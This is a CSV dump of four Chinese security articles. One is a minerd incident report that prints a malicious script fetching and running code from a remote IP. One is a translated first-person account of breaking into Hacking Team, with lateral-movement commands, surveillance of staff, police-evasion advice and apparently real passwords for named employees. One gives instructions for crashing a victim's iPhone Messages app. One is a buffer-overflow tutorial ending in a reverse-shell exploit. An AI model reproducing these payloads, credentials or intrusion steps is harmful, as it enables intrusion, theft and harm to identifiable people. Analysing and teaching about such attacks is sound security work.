"5ccbfabc4f2f0a0a7a69c0b7","对于安全工作者来说，木马既是我们的敌人，也是我们的“朋友”。甚至可以这样说，木马使我们进步，安逸使我们落后。这不，这位抗马新兵就不甘落后，分享了他的","Kong","对于安全工作者来说，木马既是我们的敌人，也是我们的“朋友”。甚至可以这样说，木马使我们进步，安逸使我们落后。这不，这位抗马新兵就不甘落后，分享了他的抗马记录。刚工作不久就遭遇了3次木马攻击，第一是是root木马，控制服务器对阿里某云进行流量攻击，后两次是minerd木马攻击，使得我们的服务器CPU异常的高，让开发工程师无法正常的登录，造成文件无法读取，工作进度受到了很大影响。有鉴于此，我就跟大家分享一下我在面对minerd木马时的学习与收获。首先我尝试登陆服务器，但是多次登录失败，而且就算登陆上去，也感觉非常卡顿，运行起来比较困难。用top观察服务器状态，如下图所示：   我发现CPU负载的确很高，同时也看到了主要运行的程序是minerd。之后按照常理我在进程中查找跟minerd相关的信息，如下图所示：观察到在/opt下存在一个minerd文件，随后进入该目录下发现存在minerd文件：我随手删掉了minerd文件，又top观察，发现CPU负载依然是很高的，此后我就想观察这个文件是如何运行的，相信大家都有这样的好奇心吧，随后我根据常识去查看cront文件，发现了如下的问题：一般我们在cront文件下是没有crontabs目录的，但是我进入该目录后，发现多了一个root文件：进去观察了一下root内容，也发现了一些问题： 主要是关于redis的信息还有一条cront指令，后来发现该木马是通过redis的漏洞进行上传，大家可以去看http://www.freebuf.com/vuls/85833.html，我出于好奇先对这个pm.sh脚本进行分析，大致内容如下：PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbinmachine=`uname -m`#echo $machinecs5=""CentOS release 5""cs6=""CentOS release 6""cs7=""CentOS Linux release 7""ub=""Ubuntu""de=""Debian""downFile(){    cd /var/lib  //进入这个目录下    if [ -x ""/usr/bin/wget""  -o  -x ""/bin/wget"" ]; then   //判断wget有没有执行权限        wget -c http://101.55.126.66:8990/pm$1 -O /var/lib/pm &amp;&amp; chmod +x /var/lib/pm &amp;&amp; /var/lib/pm   //如果有就会去下载这个文件并赋予执行权限    elif [ -x ""/usr/bin/curl""  -o  -x ""/bin/curl"" ]; then//同上         curl -fs http://101.55.126.66:8990/pm$1 -o /var/lib/pm &amp;&amp; chmod +x /var/lib/pm &amp;&amp; /var/lib/pm  //同上    fi}//主要是对系统类型进行判断来获取不同的执行脚本  if [ $machine = ""x86_64"" ]; then    if [ -f ""/etc/issue"" ]; then        version=`cat /etc/issue`        if [[ $version == $cs5* ]]; then        downFile 5    elif [[ $version == $cs6* ]]; then        downFile 6    elif [[ $version == $cs7* ]]; then        downFile 7    elif [[ $version == $ub* ]]; then        downFile ub    elif [[ $version == $de* ]]; then        downFile ub    else        if [ -f ""/etc/redhat-release"" ]; then            release=`cat /etc/redhat-release              if [[ $release == $cs5* ]]; then                downFile 5            elif [[ $release == $cs6* ]]; then                downFile 6            elif [[ $release == $cs7* ]]; then                downFile 7            fi        fi        fi    fifi之后我在/var/lib下发现了pm程序，取消了该程序的执行权限。然后我去查看黑客是否修改了一些登录认证信息等： 看到日期还有一些文件名感觉有问题，打开名为KHK75NEOiq的文件看到：    黑客很可能利用这个认证进入我们服务器，重启了sshd服务，随后我进入了/etc/init.d目录下发现有名为ntp的服务，Linux带有的服务是ntpd，还是在某度查到的信息，然后看了一下rc.d也发现了关于ntp的一些链接。看ntp的程序代码发现：从代码中看得出来ntp其实就是该木马的守护程序，所以rm掉ntp，然后kill掉minerd进程7737，发现CPU的负载直线下降，随后在系统中继续寻找ntp相关文件，发现在/var/log的目录下存在两个文件，随后进行删除，本次抗马活动结束。   本次抗马让我对Linux有了更深的理解，对于一个小兵来说更是一笔宝贵的财富。最后送给大家一句我最喜欢的话：“我一读再读，却不得不承认，青春是一本太仓促的书。”","2016-11-07 14:18:16","系统安全","“抗马”小兵的一次实战记录","http://nsoad.com/Article/system/20161107/709.html"
"5ccbfabc4f2f0a0a7a69c0b8","0x00 Hacking TeamHacking Team 是一个协助政府hack和监视记者、政治家等的公司（详见段尾链接），当然有时候也会监控恐怖分子和罪犯。其CEO——Vincenzetti&mda","silence","0x00 Hacking TeamHacking Team 是一个协助政府hack和监视记者、政治家等的公司（详见段尾链接），当然有时候也会监控恐怖分子和罪犯。其CEO——Vincenzetti——很喜欢在他的邮件末尾加上一句纳粹标语“boia chi molla” (放弃者该死)，同时，他一直宣称拥有可以解决“Tor 问题”和“暗网问题”的技术。但是我一直很怀疑他的那种技术的有效性。0x01 小心点很不幸，我们的世界是颠倒的，你越做坏事越富有，越做好事反而被抓。但幸运的是，多亏了人们的努力，比如""Tor项目""，你可以通过以下指导来防止被人抓住把柄：1) 加密的你的硬盘如果有一天你做的事被发现了，警察叔叔带走了你的电脑，尽管被发现就意味着你已经犯了很多错误，但是加密硬盘会比不加密要好得多。2) 使用虚拟机并且把所有的网络都走Tor这样就实现了两点，第一、你的所有流量都匿名了。第二、把你的个人生活和匿名操作分开了，防止两种生活互相混合。3) 不要直接连接Tor网络 (可选项)Tor不是万能药，有可能你在连接到Tor网络的时候刚好在做坏事。也可能你在退出Tor网络的时候你同样在做坏事。最好还是用别人的wifi，或者连接vpn或者中转机子，然后连接Tor匿名网络。0x02 搜集信息尽管这个过程非常无聊，但却是非常重要，目标越大越多，漏洞出现的几率就越大。1 技术方面的信息主要使用以下各种方面的信息1)Google如果使用合适的语句，你可以发现大量的意外收获。2)二级域名搜集一般来说，域名大部分都是由第三方公司提供的，你需要寻找到其域名的IP范围。当然，有时候会存在DNS域传送漏洞，这样就更好搜集信息了。3)Whois查询和反向查询通过各种Whois查询和其ip范围的域名反向查询，你也可以获得很多其他子域名，据我所知，没有免费的反向查询，除非谷歌hack。4)端口扫描和指纹提取和其他的技术不同，你可以跟公司的员工聊天。我把它作为可选项放在这里因为它不是一种攻击方式，只是搜集信息的一种方式。在扫描的过程中，该业务的入侵检测系统可能会告警，但是不用担心，整个Inernet都经常会扫描自身。对于扫描来说，Nmap是再合适不过了，它也可以识别各种服务的指纹。但是对于大规模网络来说，zmap和masscan更快速。WhatWeb和BlindElephant 适合抓取web指纹。2 社工信息对于社会工程学来说，搜集员工信息非常重要，包括他们的各自的角色，合约，使用的操作系统，浏览器，插件，软件等。一般使用如下途径：1)Google这也是最有用的工具。2)theHarvester y recon-ng我在上一个内容中就提到了这些东西，但是他们其实还有更多的用处。你可以自动快速地找到大量的信息，这也值得你去花时间阅读官方文档。3)LinkedIn你可以通过这个软件获取到大量的雇员信息，内部人员总是倾向于与他人交流。4)Data.com它就像拼图一样把各种信息整合在一起。5)File metadata你可以在他们公司发布的各种文档中找到大量有用的信息。0x03 打入内网进入内网的方式有很多种。我打入HT内网的方式是不常见的，而且比平时花的精力要多得多，所以我在这里提一下进入内网的两种常见的方式，这两种也是我推荐的。1 社工社会工程学，尤其是鱼叉式网络钓鱼，是各种渗透技巧中比较可靠的一种。更多技巧请移步段尾链接。我不想尝试对HT进行钓鱼攻击，因为这种攻击方式对他们来说太常见了，所以他们会非常警惕。既增加了难度，又容易被发现我的意图。http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.htmlhttp://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf2 购买权限多亏了勤劳的俄罗斯人和他们的渗透工具 “traffic sellers”和“bot herders”，许多公司都已经有了被入侵的电脑。几乎所有世界五百强的大型网络中都存在一些被入侵的机器。但是Hacking Team是个小公司，他们的大多数员工都是信息安全专家，所以他们内部存在被入侵机器的可能性非常小。3 技术入侵Gamma公司被黑以后，我就已经描述了一个寻找漏洞的过程：http://pastebin.com/raw.php?i=cRYvK4jbHacking Team有一个段的公网IP:inetnum:        93.62.139.32 - 93.62.139.47descr:          HT public subnet他们的网络有少量暴露在外网，比如不像Gamma公司，他们的公网地址都需要证书才能连接。HT的公网服务器主要有一个Joomla的博客(joomscan没有扫出来有用的东西)，一个邮件服务器，几个路由，两个VPN，一个垃圾邮箱过滤系统。所以我现在只能通过以下方式获取权限：发现一个Joomla的0day，或者postfix的0day，或者他们其他一个系统的0day。嵌入式系统的0day对于我来说比较靠谱点，于是我花了两周的时间，通过逆向发现了一个命令执行0day。这个0day至今仍然没有修复，所以我也不方便给出更多细节。0x04 事前准备在正式攻击之前，我做了很多测试和准备，在硬件里面写入了一个后门，并且在嵌入式系统上编译了各种各样的工具：1) busybox这个工具大多数的Unix系机器都没有。2)nmap扫描工具3)Responder.py内网中间人攻击神器4)python这个必须得有5)tcpdump抓包6)dsniff在内网中嗅探各种密码之类的，我更喜欢用HT的ettercap，但是编译起来很麻烦。7)socatNC的升级版，主要端口转发8)screen可以让你多窗口执行命令，其实也不是太需要9)socks5代理主机加上proxychains，插入内网10)tgcd通过转发端口，穿透防火墙最坑的事儿就是你把后门和工具部署上去之后，系统挂了，然后运维上去一看，全完了。所以我花了一周的时间在最后的部署之前测试我的各种后门和exp。0x05 到处看看现在我已经进入内网了，我想看到处看一下，并决定我下一步的工作。把Responder.py切换到分析模式(-A),然后用Nmap慢慢的扫着先。0x06 非关系型数据库NoSQL，这种无需认证的数据库对我来说简直就是天赐良机。当我还在担心无法通过MySQL继续下去的时候，这些缺乏认证的数据库出现了。Nmap发现了HT内网的一些数据库：27017/tcp open  mongodb       MongoDB 2.6.5| mongodb-databases:|   ok = 1|   totalSizeMb = 47547|   totalSize = 49856643072...|_    version = 2.6.527017/tcp open  mongodb       MongoDB 2.6.5| mongodb-databases:|   ok = 1|   totalSizeMb = 31987|   totalSize = 33540800512|   databases...|_    version = 2.6.5这些是做RCS测试的实例。RCS抓到的音频都存储在MongoDB里面。400G种子里面的音频就是来自这里，他们也在监视着自己。0x07 跨网段比较有趣的是，看着监视器中正在开发恶意软件的HT，尽管这对我的渗透来说并没有什么用。他们不安全的备份系统是下一个敞开的大门。根据他们自己的文档，他们的iSCSI系统应该在一个分离的网段，但是却在192.168.1.200/24网段被nmap扫描出来了：...3260/tcp open  iscsi?| iscsi-info:|   Target: iqn.2000-01.com.synology:ht-synology.name|     Address: 192.168.200.66:3260,0|_    Authentication: No authentication requiredNmap scan report for synology-backup.hackingteam.local (192.168.200.72)...3260/tcp open  iscsi?| iscsi-info:|   Target: iqn.2000-01.com.synology:synology-backup.name|     Address: 10.0.1.72:3260,0|     Address: 192.168.200.72:3260,0|_    Authentication: No authentication requirediSCS需要一个核心模块，这个核心模块在我的嵌入式系统中很难编译。所以我准备把端口转发出来以便于能够在VPS上挂载。VPS: tgcd -L -p 3260 -q 42838Sistema embebida: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1iSCSI发现了iqn.2000-01.com.synology，但是在挂载的时候出现了一些问题，它的地址同时是192.168.200.72和127.0.0.1。解决办法是：iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1然后：iscsiadm -m node --targetname=iqn.2000-01.com.synology:synology-backup.name -p 192.168.200.72 --login至此，文件系统现身了！挂载上去：vmfs-fuse -o ro /dev/sdb1 /mnt/tmp然后就可以发现若干个虚拟机的安全备份了，邮件服务器看起来很有吸引力。尽管他太大了，还是可以远程挂载上来，搜索我们想要的东西：$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk$ fdisk -l /dev/loop0/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFATentonces el offset es 2048 * 512 = 1048576$ losetup -o 1048576 /dev/loop1 /dev/loop0$ mount -o ro /dev/loop1 /mnt/exchange/现在，在/mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311 我们可以发现虚拟机的硬盘，然后 就可以挂载上去了：vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1最后，我们就可以在/mnt/part1看到所有老的邮件交换服务器上的东西了。0x08 从安全备份到域管理员其实我最感兴趣的还是想在安全备份文件里面找到一些常用的密码或者hash以便于进入物理机。我使用pwdump, cachedump 和lsadump去寻找可能的密码，最后lsdadump发现了一个bes管理服务器的账户的密码:_SC_BlackBerry MDS Connection Service0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........我通过proxychains加上嵌入式机器上的socks代理，和smb客户端去尝试这个密码：proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!'成功了！密码仍然有效，而且是本地管理员。我用代理和metasploit的psexec__psh 来获取一个meterpreter session。我在机器上抓取到了他的其他密码，包括域管理员的密码。HACKINGTEAM  BESAdmin       bes32678!!!HACKINGTEAM  Administrator  uu8dd8ndd12!HACKINGTEAM  c.pozzi        P4ssword      &lt;---- look! the sysadmin!HACKINGTEAM  m.romeo        ioLK/(90HACKINGTEAM  l.guerra       4luc@=.=HACKINGTEAM  d.martinez     W4tudul3spHACKINGTEAM  g.russo        GCBr0s0705!HACKINGTEAM  a.scarafile    Cd4432996111HACKINGTEAM  r.viscardi     Ht2015!HACKINGTEAM  a.mino         A!e$$andraHACKINGTEAM  m.bettini      Ettore&amp;Bella0314HACKINGTEAM  m.luppi        Blackou7HACKINGTEAM  s.gallucci     1S9i8m4o!HACKINGTEAM  d.milan        set!dob66HACKINGTEAM  w.furlan       Blu3.B3rry!HACKINGTEAM  d.romualdi     Rd13136f@#HACKINGTEAM  l.invernizzi   L0r3nz0123!HACKINGTEAM  e.ciceri       2O2571&amp;2EHACKINGTEAM  e.rabe         erab@4HT!0x09 下载邮件现在我有了域管理员密码，就可以进入到业务核心——邮件中了。之后做的每一步操作都有可能随身被发现，以防万一，先下载邮件，这里powershell起了很大的作用。我发现了处理日期的一个bug。在得到邮件后，我又花了两周时间去获得源码和其他东西，之后又把新的邮件下载了下来。服务器是意大利的，时间的格式是：日/月/年，我用：-ContentFilter {(Received -ge '05/06/2015') -or (Sent -ge '05/06/2015')}这个语法去搜索邮件服务器并且下载新的邮件，问题是获得了”日期错误：day不能大于12“的结果，因为欧洲时间中月份通常在第一位，月份不能大于12,。看来微软的工程师们只在他们自己的时区测试了他们的软件。0x0a 下载档案现在我已经是域管理了，我开始通过smb客户端和代理去下载各种资源：proxychains smbclient '//192.168.1.230/FAE DiskStation' \ -U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'至此，所有的东西都被下载下来了。0x0b windows域渗透简介在与HT的故事结束之前，我想对windows内网渗透做一些简介。1 横向移动(这种名词国内好像还没有对应的术语)在这里，我跟大家对各种内网渗透的技术做一些回顾。远程执行的方式是需要密码或者本地管理员的hash的。目前为止，最常见的方法是在机器上以管理员权限用mimikatz本地抓取管理员密码。而比较好的提升权限工具主要是PowerUp和bypassuac。 远程移动：1)psexecwindows上这方面很有效的工具。你可以使用psexec，winexe，metasploit的psexec_psh，powershell 的invoke_psexec或者windows内建函数""sc""。对于metasploit的模块和powershell、pth-winexe，你只需要hash即可，无需密码。这是最通用的方法，但是也是最不隐蔽的方法。时间类型7045“service control manage”会显示在时间日志中。根据我的经验，没有人会在渗透的时候注意到这个细节，但是这个细节却对事件调查者有一定的帮助。2)WMI这是最隐蔽的方法。WMI服务在除了服务器的所有windows机器上都是开着的，服务器上的防火墙默认不会允许该服务通过。你可以使用wmiexec.py，pth-wmis，powershell 的 invoke_wmi，或者windows上的内建wmic函数。所有的wmic只需要hash。3)PSRemoting该功能默认是关闭的，我也不推荐将其开启。但是如果系统管理员已经将其开启了，就非常方便了，特别是如果你用ps干所有的事都很容易，而且不会留下太多足迹。4)GPO如果以上所有的方法都被防火墙过滤了，而且你又是域管理，你就可以通过GPO给用户一个登录脚本，安装一个msi，执行一个定时任务或者就像我们看到的 Mauro Romeo 那样利用GPO开启了WMI服务并且关闭了该服务的防火墙过滤。本地移动：1) 盗取token如果你在一台电脑上有管理权限，你就可以用其他用户的token去获取域资源。这方面主要有两个工具：incognito 和mimikatz token::*命令行。2)MS14-068你可以利用Kerberos 的一个bug去获取域管理tickets。3)进程注入任何一款远控都有进程注入的功能。比如meterpreter、pupy中的migrate命令，或者pwershell中的psinject命令。你可以注入到有你需要的token的进程中。4)runas这是一款非常有用的工具，因为它不需要管理员权限。他使用的windows命令，如果你没有gui你可以使用powershell。2 维持权限一旦你拥有了权限，首先想到的就是保持权限。权限保持一般只是对于HT这样目标是个人和政治活动者的混蛋来说是个挑战(看来作者跟HT有仇)。对于渗透一个公司来说，权限保持一般不重要，因为公司一般不会关掉机器。你可以从下面的链接获取更多关于权限维持的技巧。对于渗透一个公司来说，这是不必要的，反而会增加被发现的几率。http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/http://www.hexacorn.com/blog/category/autostart-persistence/https://blog.netspi.com/tag/persistence/3 内部侦查之前最好的探测windows网络的工具是powerview。这款工具很值得你去阅读以下链接：http://www.harmj0y.net/blog/tag/powerview/http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/http://www.harmj0y.net/blog/redteaming/powerview-2-0/http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/当然，powershell也是很有效的工具，不过在2003和2000的机子上可没有powershell。你也可以像以前那样，用用""net view""这种命令，其他我喜欢的技巧主要有：1)下载文件列表通过一个域管理账户你可以用powerview下载网络中的所有文件的列表：Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] |select fullname | out-file -append files.txt}然后你就可以随心所欲选择你想要的文件来下载。2)阅读邮件我们已经知道，你可以用powershell下载邮件，而且它还有很多有用的信息。3)查看门户站点这是许多业务存储重要信息的地方。这个也可以用powershell下载下来。5)监视员工我的兴趣之一就是寻找系统管理员。监视Christian Pozzi（HT的一个管理员）给了我Nagios 服务器的权限以及“Rete Sviluppo”的权限。利用PowerSploit 中的Get-Keystrokes 和 Get-TimedScreenshot、GPO等的组合，你可以监视任何一个员工，甚至是整个域。0x0c 寻猎系统管理员通过对他们内部的文档的阅读，我发现我缺少一个很重要的权限——“Rete Sviluppo”——一个存放RCS源码的孤立网络。系统管理员总是有所有的权限，所以我就搜索Mauro Romeo 和Christian Pozzi的电脑，看他们怎么管理Sviluppo网络，顺便看看有没有其他我感兴趣的系统。他们的电脑也是域成员，所以搞到他们的电脑权限很简单。Mauro Romeo的电脑没有开放任何端口，所以我打开了WMI的端口并执行了meterpreter。为了监控他们的键盘和屏幕，我使用很多metersploit的/gathre/模块。然后到处搜索感兴趣的文件。我发现Pozzi有个加密卷，便等他把它挂载上来的时候，复制了所有的文件。他们的密码对我来说，都是没有任何用处的，我感到很可笑。因为mimikatz和键盘记录器泄露了一切。0x0d 桥梁Pozzi的加密卷中，有很多文本格式的密码。其中一些就是Nagios服务器的密码，为了方便监视，这个服务器有权限访问那个Sviluppo网络。我也就找到了一座进入孤立网络的桥梁。尽管我有那个服务器的密码，但是他还有个公开的命令执行。0x0e 再次利用并重置密码阅读邮件后，我看到了Daniele Milan有git机器的权限。我已经有了他的windows密码(mimikatz)，我在git机器上尝试了一下，成功了！而且可以sudo。为了拿到gitlab服务器和他们的推特账号，我利用了邮件服务器和“忘记密码”功能重置了密码。0x0f 总结以上就是我对抗一个公司并且终止了他们侵犯人权的行为的过程。 这也是Hacking的魅力与不对称：一个人花100个小时，便可以对抗并逆转一个有着好几年历史价值数百万美元公司的命运。Hacking能够给予失败者战斗并赢回的机会。Hacking参考通常意味着放弃：这只是一个小小的教训，做一个有道德的黑客，不要未经允许攻击他人的系统等等。我经常这样说，但是做起来却经常与之背道而驰。泄露文件，没收银行的钱财，努力让普通人的电脑变得更加安全，这才是有道德的黑客。但是，很多人称自己为“良心黑客”，其实他们只是为给他们更多钱的人工作，而那些人更应该被hack。HT视他们自己为意大利创新的一部分，但是在我看来，Vincenzetti和他的公司，他在警察中的密友，政府都是意大利法西斯主义的传统。谨以此文献给在迪亚兹阿曼多学校的突袭中的受害者们，和所有因意大利法西斯主义而受到过伤害的人们。原作：https://ghostbin.com/paste/6kho7?luicode=10000359","2016-08-04 00:37:27","Web安全","渗透Hacking Team过程","http://nsoad.com/Article/web/20160804/260.html"
"5ccbfabc4f2f0a0a7a69c0b9","研究人员表示，他们发现了一条可以让iPhone设备的Message应用崩溃的消息，影响iOS8-iOS 10.2.1。文中也提供相应的修复方法。","Kong","研究人员表示，他们发现了一条可以让iPhone设备的Message应用崩溃的消息，影响iOS8-iOS 10.2.1。先来看看演示吧不要尝试这么去做！如果你想测试自己的iPhone，后果自负1.下载文件vincedes3.com/vincedes3.vcf2.上传到 iCloud Drive, Dropbox 等3.通过Message发送这个文件给你的受害者4.等待受害者点击，然后Message应用就不能再正常工作了5.点击修复链接，修复崩溃的Message应用友情提示：自己也会白屏崩溃的，下面有解决方案。复现及修复过程图文版1.下载vcf文件，上传到 iCloud Drive2.通过短信发送给受害者3.当对方(自己)点开Message时，触发应用崩溃4.修复Message应用，点击修复链接http://vincedes3.com/save.html，删除那条恶意短信为什么会导致这样的问题呢？当你点击时，iOS要读取短信文本，文件中的文本是非常复杂的系统，并导致CPU处理不正常：应用程序冻结。你关闭应用程序，想重新打开，但iOS要重新加载以前的消息，但不能，因为它是vcf文件。这个漏洞类似于2015年5月发现的阿拉伯语文本字符串的文本消息导致iPhone崩溃。它可以使iPhone的Message应用程序崩溃，无法正常读取短信和iMessage消息，更严重的是，即使用户关闭或者重新启动iPhone，iPhone的Message应用依然处于崩溃状态。因为Messages应用程序总是尝试打开最新的文本消息，当它启动时，它会继续尝试打开恶意消息。如何修复呢？对于那些收到恶意消息的用户，要想解决这个问题，目前提供两种解决方法：1.通过单击此修复链接：http://vincedes3.com/save.html，它将打开发送新消息的窗口，按取消并删除恶意消息。2.通过在Siri发送消息给自己，或者请别人给你发送消息。收到消息后，Messages应用程序将允许您打开新消息，而不是恶意信息。注意有些ipad无法修复，原因未知。最新版HACK iOS 10.2.1 Message演示涉及文件vdf文件: vincedes3.com/vincedes3.vcf崩溃代码txt格式: vincedes3.com/crashtext.txt崩溃代码HTML格式: vincedes3.com/crashtext.html参考链接https://vincedes3.com/crash-message-app-iphone/http://securityaffairs.co/wordpress/54923/mobile-2/messages-app-bug.html","2017-01-01","漏洞发布","【漏洞预警】一条短信让对方的iPhone的Message应用崩溃(附PoC和修复方案)","http://nsoad.com/Article/exploit/20170101/vulzone-47.html"
"5ccbfabc4f2f0a0a7a69c0ba","前言本文将详细说明如何去找到一个简单的缓冲区溢出漏洞以及最终如何攻击服务获得一个反弹shell。有很多公开的漏洞可以被当做本文例子，不过我今天在exploit-db上发现PCMan","Kong","前言本文将详细说明如何去找到一个简单的缓冲区溢出漏洞以及最终如何攻击服务获得一个反弹shell。有很多公开的漏洞可以被当做本文例子，不过我今天在exploit-db上发现PCMan’s FTP Server 2.0.7的三个缓冲区溢出漏洞，所以我就决定拿这个作为本文的例子。准备工作在开始之前，我们先需要准备一下工作环境。Windows XP – SP3 Virtual Machine (Victim).Kali Linux Virtual Machine (Attacker).OllyDbg 安装在Windows XP上PCMan’s FTP Server 2.0.7除了上诉工具和环境外，你还需要对x86 汇编语言有个基本的了解对Python编程语言有个基本的了解缓冲区溢出的基础知识深入的去介绍缓冲区溢出不符合本篇文章，这里我只是介绍一下基础知识。当一个开发商不去检查用户输入的边界数据时就会发生缓冲区溢出。什么是缓冲区溢出呢？简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了。下面看几张图帮助大家来理解。典型的内存布局攻击者输入超过用户缓冲区开发人员正确处理-输入被截断，不能覆盖任何东西开发人员错误处理-输入覆盖缓冲区和EIP，导致它跳转到无效的内存地址，程序崩溃。攻击者定制输入的数据攻击者定制输入数据，让EIP指向shellcode安全圈有句老话，一切的用户输入都是有害的。只是有人因为信任用户的输入是正确的、是合理的值，这就是为什么产生了大量的漏洞的原因。查找缓冲区溢出了解完基础知识后，很明显我们现在要知道缓冲区溢出在哪里？这里我们就需要使用到模糊测试。现在我们需要发送不同长度和内容的自定义字符串到我们要测试的输入点，如果程序崩溃，你可以开心一下啦，我们就是要找程序崩溃的时候，然后来调查一下为什么会崩溃，可不可以利用。这里我们就以PCMan’s FTP Server 2.0.7为例子。首先我们来测试一下用户名这个输入点有没有存在问题。这里我们用Python编写了一个Fuzzer程序。运行我们的Fuzzer程序，发现发送到大约2000的时候挂起了，检查我们的FTP服务器，可以发现已经崩溃。接下来我们就要来进一步研究一下，确认这错误是否可以利用，我们先关闭服务器，在重启它，这次我们使用OllyDbg来监视程序崩溃时寄存器的情况。崩溃调查打开OllyDbg附加FTP Server我们按F9运行程序，再运行Fuzzer程序并等待程序崩溃，程序崩溃后我们不要关闭程序，这里注意看OllyDbg寄存器窗口已经暂停在崩溃时的值了。我们可以发现EIP寄存器的值是41414141，新手应该看不懂这是什么吧，其实这就是A的十六进制，很明显EIP写入的地址是AAAA，程序去尝试执行内存地址0x41414141，因为这个地址是无效的，所以就崩溃了。这对于我们来说，肯定是个好消息啊，这意味着我们可以控制EIP啊，现在我们需要在EIP中覆盖四个字节，所以我们需要控制EIP。控制EIP首先我们使用Metasploit的pattern_create工具创建一个2100字节的字符串。为了简洁，简写了。ruby /usr/share/metasploit-framework/tools/pattern_create.rb 2100Aa0Aa1Aa2A.......Cr5Cr6Cr7Cr8Cr9然后我们将这个字符串作为payload发送至服务器再次重复上次步骤，来观察EIP可以发现这次EIP寄存器的值是0x43386F43现在我们使用Metasploit中的另一个工具pattern_offset来确定字节数ruby /usr/share/metasploit-framework/tools/pattern_offset.rb 43386F43[*] Exact match at offset 2004现在我们知道了EIP被覆盖之前是2004个字节。为了准确性，我们继续确认一下。再次重复上次步骤观察EIP可以发现EIP寄存器的值是0x42424242，成功的被我们用四个B覆盖了。寻找Shellcode的位置这里我们来介绍一个简单的方法，我们先来查看ESP指向哪里。在当前情况下，我们可以看见内存地址是0x0012EDB8可以发现，我指向了一堆43的值，0x43恰恰是C的ASCII值。现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置。获得EIP to Jump为什么我们不能告诉EIP去内存地址0x0012EDB8呢？因为这个地址在各个计算机上都不一样得，你不可能只想这个攻击只能攻击自己计算机吧。所以这里我们就要在程序的dll中找到具有JMP ESP命令的内存地址。这样我们就可以将EIP指向该位置，使其跳转到我们的缓冲区中。让我们来看看有哪些dll加载到了这个程序。上图是一个dll加载到程序的列表，这里我们选择SHELL32.dll进行搜索。现在要搜索JMP ESP命令。返回的第一个结果是位于内存地址0x7C9D30D7,这个地址没有坏字符，我们可以来利用。坏字符是会破坏我们漏洞的字符，如0x00。接下来我们在确认一下JMP ESP命令重启OllyDbg和服务，这里我们先要设个断点。我们右键单击主程序中的空白区域，然后选择跳转到表达式，这里我们输入值7C9D30D7，这样我们就跳转到我们的返回地址JMP ESP了。我们按下F2设置断点。取消暂停OllyDbg，运行我们的Fuzzer程序。这里我们可以发现调试器已经暂停在我们的断点等待指令，F7进入下一个指令，可以发现我们已经跳转到一个长字符串INC EBX，换句话说，我们成功跳转到了我们的缓冲区。识别坏字符现在我们需要为我们的exploit创建一个shellcode来执行，但是这里有个问题，我们怎么知道什么命令有效？什么命令会导致程序怎么来执行？典型的一个例子就是空字节，空字节0x00表示字符串结束，这显然会影响我们的漏洞，当然不仅仅只有空字节，所以我们就要通过发送字符串数据来找到它们。如果字符串在特定的字符那里被截断或破坏，我们就知道这个字符对我们的漏洞产生了负面的影响。然后我们来检查发生攻击后的堆栈从上图中可以轻易发现，0x0A已经对我们的漏洞产生了影响，我们删除它，重新运行我们的程序。然后我们再来看看发生攻击后的堆栈又发现0x0D对我们的漏洞产生了影响，我们继续删除它，再运行测试程序。可以发现没有坏字符了，这里我们找到了三个坏字符，它们分别是0x0D，0x0A和0x00。可以发现0x0A表示回车，0x0D表示换行，0x00表示字符串的结束，这样就很容易理解它们为什么是坏字符了。定制Shellcode我们已经找到了坏字符，我们知道我们的shellcode中不能包含这些字符，现在让我们来生成shellcode。这里我们没必要自己来写，强大的Metasploit帮助我们解决了问题。我们来使用msfpayload生成一个shellcode，当然我这边没升级，你要是最新版是没有msfpayload，而是msfvenom，用法基本上差不多，就不多做介绍了。我们来检查一下shellcode，可以发现其中有0x00，我们在上面知道出现0x00、0x0A或0X0D都会破坏我们的payload。或者我们要告诉Metasploit不能使用那些字符。用下面命令试一下。msfpayload windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -t python接下来就是享受攻击的乐趣啦。攻击进行时-编写exploit经过上面的介绍，exploit编写很简单了，把shellcode和上面的fuzzer程序结合起来就行了。代码如下：现在我们先来使用nc来监听443端口nc -lvp 443运行我们的exploit，然后等待一段时间总结一切很顺利啊，我们成功的获得了一个shell，当然这只是一个简单的例子，这里我在声明一下，本文仅做技术交流，请大家不要使用本文的exploit去攻击互联网上的PCMan’s FTP服务，大家可以使用VM虚拟机来学习一下。","2016-11-11 17:05:16","系统安全","简单的缓冲区溢出分析","http://nsoad.com/Article/system/20161111/751.html"
